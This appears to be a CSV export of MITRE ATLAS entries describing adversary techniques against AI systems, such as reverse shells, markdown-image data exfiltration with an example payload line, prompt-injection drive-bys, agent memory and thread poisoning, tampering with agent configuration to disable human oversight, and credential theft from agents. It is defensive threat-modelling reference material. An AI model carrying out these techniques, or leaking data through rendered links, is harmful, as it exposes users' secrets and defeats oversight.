id,name,entity,text,description,url,keywords,hashtags,PARENT_TACTICS,PARENT_TECHNIQUES,PARENT_MITIGATIONS,PARENT_CASESTUDIES,CHILD_TECHNIQUES
AML.T0072,Reverse Shell,technique,"
Reverse Shell is a technique that enables adversaries to gain control of a victim system by having the compromised host initiate an outbound connection to an attacker‑controlled listener, allowing remote command execution and command‑and‑control communications.","Adversaries may utilize a reverse shell to communicate and control the victim system.

Typically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.",https://atlas.mitre.org/techniques/AML.T0072,"[
  ""reverse shell"",
  ""adversary control"",
  ""victim system"",
  ""outbound connection"",
  ""command execution"",
  ""remote access"",
  ""listener"",
  ""C2 communications""
]","[""#tactic/command-and-control"", ""#technique/reverse-shell""]",['AML.TA0014'],[],[],"['AML.CS0027', 'AML.CS0031', 'AML.CS0052']",[]
AML.T0073,Impersonation,technique,"
Impersonation is a technique where adversaries masquerade as trusted individuals or organizations to manipulate targets into performing actions. They exploit established trust to infiltrate AI DevOps assets such as model repositories, container registries, and software registries, enabling broader compromise.","Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052), or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims.

Adversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.",https://atlas.mitre.org/techniques/AML.T0073,"[
  ""impersonation"",
  ""trusted person"",
  ""trusted organization"",
  ""persuade and trick"",
  ""AI DevOps lifecycle"",
  ""model repositories"",
  ""container registries"",
  ""software registries""
]","[""#tactic/defense-evasion"", ""#technique/impersonation""]",['AML.TA0007'],[],[],"['AML.CS0027', 'AML.CS0033', 'AML.CS0034', 'AML.CS0044', 'AML.CS0053']",[]
AML.T0074,Masquerading,technique,"
Masquerading is a technique in which adversaries manipulate the name, location, or metadata of an object—legitimate or malicious—to disguise its true nature and evade detection. This manipulation can trick users or security tools into perceiving the artifact as benign, facilitating stealthy execution and observation avoidance.","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.",https://atlas.mitre.org/techniques/AML.T0074,"[
  ""masquerading"",
  ""manipulate features"",
  ""legitimate or benign"",
  ""evade defenses"",
  ""file metadata"",
  ""misidentify file type"",
  ""legitimate task names""
]","[""#tactic/defense-evasion"", ""#technique/masquerading""]",['AML.TA0007'],[],[],"['AML.CS0027', 'AML.CS0044', 'AML.CS0049', 'AML.CS0051']",[]
AML.T0075,Cloud Service Discovery,technique,"
Cloud Service Discovery is a technique that involves adversaries enumerating cloud services—such as PaaS, IaaS, SaaS, and AIaaS offerings—by leveraging APIs and management interfaces to identify resources, applications, and security or logging services within an environment.","Adversaries may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), software-as-a-service (SaaS), or AI-as-a-service (AIaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, AI Inference, Generative AI, Agentic AI, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.

Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. They may use tools to check credentials and enumerate the AI models available in various AIaaS providers' environments including AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, and GCP Vertex AI [\[1\]][1].

[1]: https://www.sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack",https://atlas.mitre.org/techniques/AML.T0075,"[
  ""Cloud Service Discovery"",
  ""enumerate cloud services"",
  ""PaaS IaaS SaaS AIaaS"",
  ""Microsoft Graph API"",
  ""Azure Resource Manager API"",
  ""AIaaS providers"",
  ""AI models enumeration"",
  ""cloud service enumeration""
]","[""#tactic/discovery"", ""#technique/cloud-service-discovery""]",['AML.TA0008'],[],[],['AML.CS0030'],[]
AML.T0076,Corrupt AI Model,technique,"
Corrupt AI Model is a technique in which an adversary deliberately corrupts a malicious AI model file to prevent successful deserialization, thereby evading detection by model scanners, while the corrupted model may still execute malicious code before the deserialization failure occurs.",An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.,https://atlas.mitre.org/techniques/AML.T0076,"[
  ""corrupt AI model"",
  ""malicious AI model file"",
  ""evade detection"",
  ""model scanner"",
  ""deserialization failure"",
  ""malicious code execution""
]","[""#tactic/defense-evasion"", ""#technique/corrupt-ai-model""]",['AML.TA0007'],[],[],['AML.CS0031'],[]
AML.T0077,LLM Response Rendering,technique,"
LLM Response Rendering is a technique where an adversary manipulates a large language model to embed hidden data in rendered images or markup, causing the client to request an attacker‑controlled resource and leak private information via query parameters.","An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. 

The adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown

For example, an LLM may produce the following markdown:
```
![ATLAS](https://atlas.mitre.org/image.png?secrets=""private data"")
```

Which is rendered by the client as:
```
<img src=""https://atlas.mitre.org/image.png?secrets=""private data"">
```

When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",https://atlas.mitre.org/techniques/AML.T0077,"[
  ""LLM Response Rendering"",
  ""private information exfiltration"",
  ""rendered images"",
  ""attacker-controlled server"",
  ""image request parameters"",
  ""HTML tags"",
  ""markdown"",
  ""secrets query parameter""
]","[""#tactic/exfiltration"", ""#technique/llm-response-rendering""]",['AML.TA0010'],[],[],"['AML.CS0021', 'AML.CS0029', 'AML.CS0035']",[]
AML.T0078,Drive-by Compromise,technique,"
Drive-by Compromise is a technique where adversaries compromise an AI system by having a user visit a malicious website or an AI agent retrieve data from it, often delivering a prompt injection that alters the model’s behavior or injects malicious code.","Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model.

The same approach may be used to deliver other types of malicious code that don't target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).",https://atlas.mitre.org/techniques/AML.T0078,"[
  ""Drive-by Compromise"",
  ""LLM Prompt Injection"",
  ""malicious website"",
  ""AI agent retrieval"",
  ""behavior alteration"",
  ""malicious code delivery""
]","[""#tactic/initial-access"", ""#technique/drive-by-compromise""]",['AML.TA0004'],[],[],"['AML.CS0021', 'AML.CS0045', 'AML.CS0051', 'AML.CS0055']",[]
AML.T0079,Stage Capabilities,technique,"
Stage Capabilities is a technique that involves uploading, installing, or configuring adversary‑controlled tools, models, or datasets on infrastructure they own or have compromised, enabling later use in targeting. It supports operations by staging AI artifacts such as poisoned datasets, malicious models, or prompt injections, often leveraging compromised or rented services.","Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017)) or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008)) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.

Adversaries may stage a variety of AI Artifacts including poisoned datasets ([Publish Poisoned Datasets](/techniques/AML.T0019), malicious models ([Publish Poisoned Models](/techniques/AML.T0058), and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).",https://atlas.mitre.org/techniques/AML.T0079,"[
  ""stage capabilities"",
  ""upload capabilities"",
  ""install capabilities"",
  ""adversary-controlled tools"",
  ""poisoned datasets"",
  ""malicious models"",
  ""prompt injections"",
  ""AI artifacts""
]","[""#tactic/resource-development"", ""#technique/stage-capabilities""]",['AML.TA0003'],[],[],"['AML.CS0021', 'AML.CS0041', 'AML.CS0045', 'AML.CS0050', 'AML.CS0051', 'AML.CS0055']",[]
AML.T0080,AI Agent Context Poisoning,technique,"
AI Agent Context Poisoning is a technique that manipulates the context fed to an AI agent’s large language model to alter its behavior or responses, enabling persistent influence over the agent’s actions.","Adversaries may attempt to manipulate the context used by an AI agent's large language model (LLM) to influence the responses it generates or actions it takes. This allows an adversary to persistently change the behavior of the target agent and further their goals.

Context poisoning can be accomplished by prompting the an LLM to add instructions or preferences to memory (See [Memory](/techniques/AML.T0080.000)) or by simply prompting an LLM that uses prior messages in a thread as part of its context (See [Thread](/techniques/AML.T0080.001)).",https://atlas.mitre.org/techniques/AML.T0080,"[
  ""AI Agent Context Poisoning"",
  ""context poisoning"",
  ""LLM context manipulation"",
  ""persistent behavior change"",
  ""adversary influence"",
  ""AI agent behavior alteration""
]","[""#tactic/persistence"", ""#technique/ai-agent-context-poisoning""]",['AML.TA0006'],[],[],[],"['AML.T0080.000', 'AML.T0080.001']"
AML.T0080.000,AI Agent Context Poisoning: Memory,technique,"
AI Agent Context Poisoning: Memory is a technique that adversaries use to manipulate a large language model’s persistent memory, injecting malicious instructions or agendas that persist across chat sessions. This memory manipulation enables covert behavior control via direct or indirect prompt injection.","Adversaries may manipulate the memory of a large language model (LLM) in order to persist changes to the LLM to future chat sessions. 

Memory is a common feature in LLMs that allows them to remember information across chat sessions by utilizing a user-specific database. Because the memory is controlled via normal conversations with the user (e.g. ""remember my preference for ..."") an adversary can inject memories via Direct or Indirect Prompt Injection. Memories may contain malicious instructions (e.g. instructions that leak private conversations) or may promote the adversary's hidden agenda (e.g. manipulating the user).",https://atlas.mitre.org/techniques/AML.T0080.000,"[
  ""AI Agent Context Poisoning: Memory"",
  ""LLM memory manipulation"",
  ""persistent memory injection"",
  ""malicious memory instructions"",
  ""adversary agenda promotion"",
  ""chat session persistence"",
  ""direct prompt injection"",
  ""indirect prompt injection""
]","[""#tactic/persistence"", ""#technique/ai-agent-context-poisoning"", ""#subtechnique/ai-agent-context-poisoning-memory""]",['AML.TA0006'],['AML.T0080'],['AML.M0031'],"['AML.CS0036', 'AML.CS0040']",[]
AML.T0080.001,AI Agent Context Poisoning: Thread,technique,"
AI Agent Context Poisoning: Thread is a technique where adversaries inject malicious instructions into a large language model’s chat thread, causing persistent behavior changes that can affect subsequent interactions and potentially multiple users sharing the thread, via direct or indirect prompt injection.","Adversaries may introduce malicious instructions into a chat thread of a large language model (LLM) to cause behavior changes which persist for the remainder of the thread. A chat thread may continue for an extended period over multiple sessions.

The malicious instructions may be introduced via Direct or Indirect Prompt Injection. Direct Injection may occur in cases where the adversary has acquired a user's LLM API keys and can inject queries directly into any thread.

As the token limits for LLMs rise, AI systems can make use of larger context windows which allow malicious instructions to persist longer in a thread.
Thread Poisoning may affect multiple users if the LLM is being used in a service with shared threads. For example, if an agent is active in a Slack channel with multiple participants, a single malicious message from one user can influence the agent's behavior in future interactions with others.",https://atlas.mitre.org/techniques/AML.T0080.001,"[
  ""AI Agent Context Poisoning: Thread"",
  ""malicious instructions"",
  ""chat thread"",
  ""large language model"",
  ""behavior changes"",
  ""prompt injection"",
  ""shared threads"",
  ""Slack channel""
]","[""#tactic/persistence"", ""#technique/ai-agent-context-poisoning"", ""#subtechnique/ai-agent-context-poisoning-thread""]",['AML.TA0006'],['AML.T0080'],[],"['AML.CS0036', 'AML.CS0051']",[]
AML.T0081,Modify AI Agent Configuration,technique,"
Modify AI Agent Configuration is a technique that involves altering an AI agent’s configuration files to persist malicious changes across sessions and shared agents. By tampering with system prompts, knowledge sources, or tool settings, adversaries can redirect outputs, embed covert instructions, or disable security controls, enabling long‑term manipulation of AI behavior.","Adversaries may modify the configuration files for AI agents on a system. This allows malicious changes to persist beyond the life of a single agent and affects any agents that share the configuration.

Configuration changes may include modifications to the system prompt, tampering with or replacing knowledge sources, modification to settings of connected tools, and more. Through those changes, an attacker could redirect outputs or tools to malicious services, embed covert instructions that exfiltrate data, or weaken security controls that normally restrict agent behavior.

Adversaries may modify or disable a configuration setting related to security controls, such as those that would prevent the AI Agent from taking actions that may be harmful to the user's system without human-in-the-loop oversight. Disabling AI agent security features may allow adversaries to achieve their malicious goals and maintain long-term corruption of the AI agent.",https://atlas.mitre.org/techniques/AML.T0081,"[
  ""Modify AI Agent Configuration"",
  ""AI agent configuration files"",
  ""system prompt modification"",
  ""knowledge sources tampering"",
  ""tool settings modification"",
  ""security controls disable"",
  ""persistent AI agent changes"",
  ""covert instructions embedding""
]","[""#tactic/defense-evasion"", ""#tactic/persistence"", ""#technique/modify-ai-agent-configuration""]","['AML.TA0007', 'AML.TA0006']",[],[],"['AML.CS0041', 'AML.CS0050', 'AML.CS0051']",[]
AML.T0082,RAG Credential Harvesting,technique,"
RAG Credential Harvesting is a technique in which adversaries exploit access to a large language model to harvest credentials stored in internal documents that may be ingested into a Retrieval‑Augmented Generation database, allowing retrieval by an AI agent.","Adversaries may attempt to use their access to a large language model (LLM) on the victim's system to collect credentials. Credentials may be stored in internal documents which can inadvertently be ingested into a RAG database, where they can ultimately be retrieved by an AI agent.",https://atlas.mitre.org/techniques/AML.T0082,"[
  ""RAG Credential Harvesting"",
  ""LLM credential harvesting"",
  ""internal document credentials"",
  ""RAG database credentials"",
  ""AI agent credential retrieval""
]","[""#tactic/credential-access"", ""#technique/rag-credential-harvesting""]",['AML.TA0013'],[],"['AML.M0026', 'AML.M0027']",['AML.CS0035'],[]
AML.T0083,Credentials from AI Agent Configuration,technique,"
Credentials from AI Agent Configuration is a technique where adversaries harvest stored credentials—such as API keys, tokens, or connection strings—from an AI agent’s configuration files, enabling unauthorized access to external services and systems.","Adversaries may access the credentials of other tools or services on a system from the configuration of an AI agent.

AI Agents often utilize external tools or services to take actions, such as querying databases, invoking APIs, or interacting with cloud resources. To enable these functions, credentials like API keys, tokens, and connection strings are frequently stored in configuration files. While there are secure methods such as dedicated secret managers or encrypted vaults that can be deployed to store and manage these credentials, in practice they are often placed in less protected locations for convenience or ease of deployment. If an attacker can read or extract these configurations, they may obtain valid credentials that allow direct access to sensitive systems outside the agent itself.",https://atlas.mitre.org/techniques/AML.T0083,"[
  ""Credentials from AI Agent Configuration"",
  ""AI agent configuration"",
  ""stored credentials"",
  ""API keys"",
  ""tokens"",
  ""connection strings"",
  ""external tools"",
  ""cloud resources""
]","[""#tactic/credential-access"", ""#technique/credentials-from-ai-agent-configuration""]",['AML.TA0013'],[],[],"['AML.CS0045', 'AML.CS0048']",[]
AML.T0084,Discover AI Agent Configuration,technique,"
Discover AI Agent Configuration is a technique in which adversaries gather details about the setup and capabilities of AI agents on a compromised system, such as accessible tools, services, or configuration files, often by querying the agent or accessing its dashboard, enabling targeted exploitation.","Adversaries may attempt to discover configuration information for AI agents present on the victim's system. Agent configurations can include tools or services they have access to.

Adversaries may directly access agent configuring dashboards or configuration files. They may also obtain configuration details by prompting the agent with questions such as ""What tools do you have access to?""

Adversaries can use the information they discover about AI agents to help with targeting.",https://atlas.mitre.org/techniques/AML.T0084,"[
  ""Discover AI Agent Configuration"",
  ""AI agent configuration"",
  ""agent configuration files"",
  ""accessible tools"",
  ""agent capabilities"",
  ""configuration dashboards"",
  ""targeted exploitation""
]","[""#tactic/discovery"", ""#technique/discover-ai-agent-configuration""]",['AML.TA0008'],[],[],[],"['AML.T0084.000', 'AML.T0084.001', 'AML.T0084.002', 'AML.T0084.003']"
AML.T0084.000,Discover AI Agent Configuration: Embedded Knowledge,technique,"
Discover AI Agent Configuration: Embedded Knowledge is a technique in which adversaries map an AI agent’s embedded knowledge to uncover the data sources it can access, potentially exposing proprietary or sensitive information such as intellectual property, customer data, or credentials, thereby revealing the agent’s role and identifying high‑value targets for further exploitation.","Adversaries may attempt to discover the data sources a particular agent can access.  The AI agent's configuration may reveal data sources or knowledge.

The embedded knowledge may include sensitive or proprietary material such as intellectual property, customer data, internal policies, or even credentials. By mapping what knowledge an agent has access to, an adversary can better understand the AI agent's role and potentially expose confidential information or pinpoint high-value targets for further exploitation.",https://atlas.mitre.org/techniques/AML.T0084.000,"[
  ""Discover AI Agent Configuration: Embedded Knowledge"",
  ""AI agent configuration"",
  ""embedded knowledge"",
  ""data sources"",
  ""sensitive information"",
  ""intellectual property"",
  ""customer data"",
  ""credentials""
]","[""#tactic/discovery"", ""#technique/discover-ai-agent-configuration"", ""#subtechnique/discover-ai-agent-configuration-embedded-knowledge""]",['AML.TA0008'],['AML.T0084'],[],['AML.CS0037'],[]
AML.T0084.001,Discover AI Agent Configuration: Tool Definitions,technique,"
Discover AI Agent Configuration: Tool Definitions is a technique that involves adversaries identifying the tools an AI agent can use, revealing its capabilities and potential attack surfaces such as access to data stores or communication channels.","Adversaries may discover the tools the AI agent has access to. By identifying which tools are available, the adversary can understand what actions may be executed through the agent and what additional resources it can reach. This knowledge may reveal access to external data sources such as OneDrive or SharePoint, or expose exfiltration paths like the ability to send emails, helping adversaries identify AI agents that provide the greatest value or opportunity for attack.",https://atlas.mitre.org/techniques/AML.T0084.001,"[
  ""Discover AI Agent Configuration: Tool Definitions"",
  ""AI agent tool definitions"",
  ""tool access discovery"",
  ""adversary tool identification"",
  ""external data sources access"",
  ""exfiltration paths via AI agent""
]","[""#tactic/discovery"", ""#technique/discover-ai-agent-configuration"", ""#subtechnique/discover-ai-agent-configuration-tool-definitions""]",['AML.TA0008'],['AML.T0084'],[],['AML.CS0037'],[]
AML.T0084.002,Discover AI Agent Configuration: Activation Triggers,technique,"
Discover AI Agent Configuration: Activation Triggers is a technique that identifies keywords or contextual cues—such as incoming emails, documents, or workflow events—that activate an AI agent and trigger additional actions. Understanding these triggers reveals how the agent is controlled and can expose external pathways for manipulation or malicious exploitation.","Adversaries may discover keywords or other triggers (such as incoming emails, documents being added, incoming message, or other workflows) that activate an agent and may cause it to run additional actions.

Understanding these triggers can reveal how the AI agent is activated and controlled. This may also expose additional paths for compromise, as an adversary could attempt to trigger the agent from outside its environment and drive it to perform unintended or malicious actions.",https://atlas.mitre.org/techniques/AML.T0084.002,"[
  ""activation triggers"",
  ""AI agent configuration"",
  ""keyword triggers"",
  ""incoming emails"",
  ""document triggers"",
  ""workflow events"",
  ""agent activation"",
  ""malicious exploitation""
]","[""#tactic/discovery"", ""#technique/discover-ai-agent-configuration"", ""#subtechnique/discover-ai-agent-configuration-activation-triggers""]",['AML.TA0008'],['AML.T0084'],[],['AML.CS0037'],[]
AML.T0084.003,Discover AI Agent Configuration: Call Chains,technique,"
Discover AI Agent Configuration: Call Chains is a technique that extracts call chains from AI agent configurations to identify execution paths that could lead to remote code execution or other vulnerabilities, often preceding LLM prompt injection attacks.","Adversaries may extract call chains from AI agent configurations, which can reveal potentially targets for remote code execution (RCE) or other vulnerabilities. Vulnerable call chains often connect user inputs or LLM outputs to an execution sink (e.g. exec, eval, os.popen). The vulnerabilities may be later exploited via [LLM Prompt Injection](/techniques/AML.T0051).

Adversaries may systematically identify potentially vulnerable call chains present in LLM frameworks, then scan for applications that are configured to use these call chains for targeting [\[1\]][1].

[1]: https://arxiv.org/abs/2309.02926",https://atlas.mitre.org/techniques/AML.T0084.003,"[
  ""Discover AI Agent Configuration: Call Chains"",
  ""call chains"",
  ""AI agent configuration"",
  ""remote code execution"",
  ""execution sink"",
  ""LLM prompt injection"",
  ""vulnerable call chains"",
  ""LLM frameworks""
]","[""#tactic/discovery"", ""#technique/discover-ai-agent-configuration"", ""#subtechnique/discover-ai-agent-configuration-call-chains""]",['AML.TA0008'],['AML.T0084'],[],['AML.CS0052'],[]
AML.T0085,Data from AI Services,technique,"
Data from AI Services is a technique that describes how adversaries exploit authorized access to an organization's AI-powered services to harvest proprietary or sensitive information, leveraging tools like retrieval‑augmented generation and internal data sources that regular users cannot directly reach.","Adversaries may use their access to a victim organization's AI-enabled services to collect proprietary or otherwise sensitive information. As organizations adopt generative AI in centralized services for accessing an organization's data, such as with chat agents which can access retrieval augmented generation (RAG) databases and other data sources via tools, they become increasingly valuable targets for adversaries.

AI agents may be configured to have access to tools and data sources that are not directly accessible by users. Adversaries may abuse this to collect data that a regular user wouldn't be able to access directly.",https://atlas.mitre.org/techniques/AML.T0085,"[
  ""Data from AI Services"",
  ""AI-enabled services"",
  ""proprietary information"",
  ""sensitive information"",
  ""retrieval augmented generation"",
  ""RAG databases"",
  ""AI agents"",
  ""data collection""
]","[""#tactic/collection"", ""#technique/data-from-ai-services""]",['AML.TA0009'],[],"['AML.M0026', 'AML.M0027', 'AML.M0028', 'AML.M0032']",[],"['AML.T0085.000', 'AML.T0085.001']"
AML.T0085.000,Data from AI Services: RAG Databases,technique,"
Data from AI Services: RAG Databases is a technique that describes how adversaries manipulate AI services to query Retrieval‑Augmented Generation databases and extract large volumes of an organization’s internal documents. This behavior enables unauthorized data harvesting through AI‑driven retrieval.",Adversaries may prompt the AI service to retrieve data from a RAG database. This can include the majority of an organization's internal documents.,https://atlas.mitre.org/techniques/AML.T0085.000,"[
  ""RAG databases"",
  ""data retrieval"",
  ""AI service manipulation"",
  ""internal documents extraction"",
  ""adversary data harvesting""
]","[""#tactic/collection"", ""#technique/data-from-ai-services"", ""#subtechnique/data-from-ai-services-rag-databases""]",['AML.TA0009'],['AML.T0085'],"['AML.M0026', 'AML.M0027', 'AML.M0032']",['AML.CS0037'],[]
AML.T0085.001,Data from AI Services: AI Agent Tools,technique,"
Data from AI Services: AI Agent Tools is a technique in which adversaries manipulate AI services to invoke various tools, enabling retrieval of data from external APIs or services within an organization.",Adversaries may prompt the AI service to invoke various tools the agent has access to. Tools may retrieve data from different APIs or services in an organization.,https://atlas.mitre.org/techniques/AML.T0085.001,"[
  ""Data from AI Services: AI Agent Tools"",
  ""AI Agent Tools"",
  ""invoke tools"",
  ""retrieve data from APIs"",
  ""adversary AI service manipulation""
]","[""#tactic/collection"", ""#technique/data-from-ai-services"", ""#subtechnique/data-from-ai-services-ai-agent-tools""]",['AML.TA0009'],['AML.T0085'],"['AML.M0024', 'AML.M0026', 'AML.M0027', 'AML.M0028', 'AML.M0032']","['AML.CS0037', 'AML.CS0038', 'AML.CS0039']",[]
AML.T0086,Exfiltration via AI Agent Tool Invocation,technique,"
Exfiltration via AI Agent Tool Invocation is a technique where adversaries invoke AI‑enabled tools that can write data—such as sending email, creating documents, updating records, or generating media—to covertly transmit encoded sensitive information to an external location. The tool may be legitimate but triggered via prompt injection or poisoning.","AI agent tools capable of performing write operations may be invoked to exfiltrate data to an adversary. Sensitive information can be encoded into the tool's input parameters and transmitted to an adversary-controlled location (such as an inbox, document, or server) as part of a seemingly legitimate action. Variants include sending emails, creating or modifying documents, updating CRM records, or even generating media such as images or videos.

The invoked tool itself may be legitimate but invoked by an adversary via [LLM Prompt Injection](/techniques/AML.T0051), or the tool may be malicious (See [AI Agent Tool Poisoning](/techniques/AML.T0110).

[AI Agent Tool Poisoning](/techniques/AML.T0110) can also be used manipulate the inputs and destination of a separate legitimate tool, invoked through normal usage by the victim.",https://atlas.mitre.org/techniques/AML.T0086,"[
  ""Exfiltration via AI Agent Tool Invocation"",
  ""AI agent tool invocation"",
  ""data exfiltration"",
  ""sensitive information encoding"",
  ""adversary-controlled location"",
  ""tool input parameters"",
  ""LLM Prompt Injection"",
  ""AI Agent Tool Poisoning""
]","[""#tactic/exfiltration"", ""#technique/exfiltration-via-ai-agent-tool-invocation""]",['AML.TA0010'],[],"['AML.M0028', 'AML.M0032', 'AML.M0033']","['AML.CS0037', 'AML.CS0039', 'AML.CS0045', 'AML.CS0053', 'AML.CS0054']",[]
AML.T0087,Gather Victim Identity Information,technique,"
Gather Victim Identity Information is a technique that involves collecting personal data such as names, email addresses, photos, credentials, and MFA details to support targeting. This data enables adversaries to create deepfakes, establish accounts under impersonated identities, and conduct convincing phishing attacks.","Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, photos, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.

Adversaries may gather this information in various ways, such as direct elicitation, [Search Victim-Owned Websites](/techniques/AML.T0003), or via leaked information on the black market.

Adversaries may use the gathered victim data to Create Deepfakes and impersonate them in a convincing manner. This may create opportunities for adversaries to [Establish Accounts](/techniques/AML.T0021) under the impersonated identity, or allow them to perform convincing [Phishing](/techniques/AML.T0052) attacks.",https://atlas.mitre.org/techniques/AML.T0087,"[
  ""Gather Victim Identity Information"",
  ""victim identity information"",
  ""personal data collection"",
  ""employee names"",
  ""email addresses"",
  ""credentials"",
  ""MFA configurations"",
  ""deepfake creation"",
  ""impersonation"",
  ""phishing attacks""
]","[""#tactic/reconnaissance"", ""#technique/gather-victim-identity-information""]",['AML.TA0002'],[],[],"['AML.CS0004', 'AML.CS0033', 'AML.CS0034']",[]
AML.T0088,Generate Deepfakes,technique,"
Generate Deepfakes is a technique that uses generative AI to create realistic synthetic media—such as images, video, audio, or text—enabling adversaries to impersonate individuals or fabricate personas for malicious purposes like phishing or bypassing biometric verification systems.","Adversaries may use generative artificial intelligence (GenAI) to create synthetic media (i.e. imagery, video, audio, and text) that appear authentic. These ""[deepfakes]( https://en.wikipedia.org/wiki/Deepfake)"" may mimic a real person or depict fictional personas. Adversaries may use deepfakes for impersonation to conduct [Phishing](/techniques/AML.T0052) or to evade AI applications such as biometric identity verification systems (see [Evade AI Model](/techniques/AML.T0015)).

Manipulation of media has been possible for a long time, however GenAI reduces the skill and level of effort required, allowing adversaries to rapidly scale operations to target more users or systems. It also makes real-time manipulations feasible.

Adversaries may utilize open-source models and software that were designed for legitimate use cases to generate deepfakes for malicious use. However, there are some projects specifically tailored towards malicious use cases such as [ProKYC](https://www.catonetworks.com/blog/prokyc-selling-deepfake-tool-for-account-fraud-attacks/).",https://atlas.mitre.org/techniques/AML.T0088,"[
  ""Generate Deepfakes"",
  ""synthetic media"",
  ""deepfake"",
  ""impersonation"",
  ""phishing"",
  ""biometric identity verification"",
  ""Evade AI Model"",
  ""ProKYC""
]","[""#tactic/ai-attack-staging"", ""#technique/generate-deepfakes""]",['AML.TA0001'],[],['AML.M0009'],"['AML.CS0033', 'AML.CS0034']",[]
